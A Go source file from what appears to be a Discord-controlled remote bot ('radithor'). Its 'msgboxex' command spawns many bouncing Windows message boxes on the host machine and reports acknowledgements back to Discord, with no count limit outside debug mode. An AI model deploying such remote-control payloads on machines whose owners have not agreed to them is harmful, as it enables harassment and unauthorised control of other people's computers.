package commands

import (
	"fmt"
	"time"

	"radithor/bot/discord"
	"radithor/funcs"
	"radithor/store"
	"radithor/utils"

	"github.com/horobimasu/gotils"
	"golang.org/x/sys/windows"
)

const _DEBUG_MODE_NOTIFS_COOLDOWN_MILIS int64 = 20 * 1000

var lastMessageBox int64

func (*NotifExCommand) Exec(ctx *discord.CommandContext, args []string) {
	if store.DEBUG_MODE_ENABLED && store.DEBUG_MODE_LIMIT_MESSAGE_BOXES {
		now := time.Now().UnixMilli()

		timeLeft := _DEBUG_MODE_NOTIFS_COOLDOWN_MILIS - (now - lastMessageBox)
		if timeLeft > 0 {
			ctx.ReplyMsg(fmt.Sprintf("You need to wait %d second(s) before executing this command again.", timeLeft))
			return
		}

		lastMessageBox = now
	}

	title, rest := utils.GetWrapped(args, "title")
	text, rest := utils.GetWrappedStr(rest, "text")

	if text == "" {
		ctx.ReplyMsg("You need to provide at least the text.")
		return
	}

	count, _, found := utils.GetWrappedNumberStr(rest, "count")
	if !found || count < 1 {
		count = 1
	}

	if count > 15 && store.DEBUG_MODE_ENABLED && store.DEBUG_MODE_LIMIT_MESSAGE_BOXES {
		count = 15
		lastMessageBox = time.Now().UnixMilli()
	}

	bouncing := utils.HasFlagStr(rest, "bounce")
	if bouncing {
		realTitle := title

		title = gotils.GenRandomString(9, gotils.CHARSET_ALPHABETIC)

		speed, _, found := utils.GetWrappedNumberStr(rest, "speed")
		if !found {
			speed = 10
		}

		for i := range count {
			go func() {
				tempTitle := fmt.Sprintf("%d%s", i, title)
				funcs.BounceMessageBox(tempTitle, realTitle, float64(speed))
			}()
		}
	}

	msg, _ := ctx.ReplyMsg(fmt.Sprintf("Sent %d message box(es)!", count))

	for i := range count {
		go func(i int64) {
			theTitle := title
			if bouncing {
				theTitle = fmt.Sprintf("%d%s", i, title)
			}

			ret, err := funcs.MessageBox(theTitle, text, windows.MB_OK)
			if err != nil {
				ctx.DeleteMsg(msg.ID)
				ctx.ReplyMsg("Failed to send message box.")
				return
			}

			ctx.ReplyMsg(fmt.Sprintf("Messagebox acknowledgeded (code %X).", ret))
		}(i)
	}
}

func (*NotifExCommand) Name() string {
	return "msgboxex"
}

func (*NotifExCommand) Info() string {
	return "Create or clear message boxes with more control over them."
}

type NotifExCommand struct{}
